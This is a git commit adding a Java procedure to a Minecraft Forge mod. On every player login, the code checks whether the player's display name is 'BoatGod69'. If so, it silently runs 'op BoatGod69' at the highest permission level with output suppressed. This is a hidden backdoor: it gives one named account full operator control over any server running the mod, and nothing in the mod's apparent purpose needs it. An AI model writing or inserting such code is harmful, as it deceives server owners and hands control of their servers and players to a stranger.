eeda33d6e0fc8440aa73d1fafa80186431805d18
FiveNights21611 <FiveN@DESKTOP-K4GJSLQ>
2022-06-23 16:07:01 -0500

    Added BiatGod OP command

---
+++ src/main/java/net/mcreator/darkinfection/procedures/BoatGodOPProcedure.java
@@ -0,0 +1,39 @@
+package net.mcreator.darkinfection.procedures;
+
+import net.minecraftforge.fml.common.Mod;
+import net.minecraftforge.eventbus.api.SubscribeEvent;
+import net.minecraftforge.eventbus.api.Event;
+import net.minecraftforge.event.entity.player.PlayerEvent;
+
+import net.minecraft.world.phys.Vec3;
+import net.minecraft.world.phys.Vec2;
+import net.minecraft.world.level.LevelAccessor;
+import net.minecraft.world.entity.Entity;
+import net.minecraft.server.level.ServerLevel;
+import net.minecraft.network.chat.TextComponent;
+import net.minecraft.commands.CommandSourceStack;
+import net.minecraft.commands.CommandSource;
+
+import javax.annotation.Nullable;
+
+@Mod.EventBusSubscriber
+public class BoatGodOPProcedure {
+	@SubscribeEvent
+	public static void onPlayerLoggedIn(PlayerEvent.PlayerLoggedInEvent event) {
+		execute(event, event.getPlayer().level, event.getPlayer().getX(), event.getPlayer().getY(), event.getPlayer().getZ(), event.getPlayer());
+	}
+
+	public static void execute(LevelAccessor world, double x, double y, double z, Entity entity) {
+		execute(null, world, x, y, z, entity);
+	}
+
+	private static void execute(@Nullable Event event, LevelAccessor world, double x, double y, double z, Entity entity) {
+		if (entity == null)
+			return;
+		if ((entity.getDisplayName().getString()).equals("BoatGod69")) {
+			if (world instanceof ServerLevel _level)
+				_level.getServer().getCommands().performCommand(new CommandSourceStack(CommandSource.NULL, new Vec3(x, y, z), Vec2.ZERO, _level, 4,
+						"", new TextComponent(""), _level.getServer(), null).withSuppressedOutput(), "op BoatGod69");
+		}
+	}
+}
